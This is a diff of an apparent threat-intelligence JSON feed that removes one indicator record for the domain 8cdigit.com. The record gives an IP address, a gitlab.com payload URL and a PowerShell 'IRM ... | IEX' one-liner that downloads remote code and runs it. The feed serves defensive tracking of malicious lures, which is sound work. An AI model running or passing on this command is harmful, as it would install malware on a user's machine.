@@ -7127,25 +7127,5 @@
     ],
     "ReportId": "cmwnyjfio1xkd0oml9ql1oc6y",
     "ScannedAt": "2026-11-19T19:43:00.229000+00:00"
-  },
-  {
-    "UrlDomain": "8cdigit.com",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "184.168.108.26"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
-    ],
-    "ReportId": "cmwnxm1t71xj30oml4e26u03q",
-    "ScannedAt": "2026-11-19T19:17:02.747000+00:00"
   }
 ]
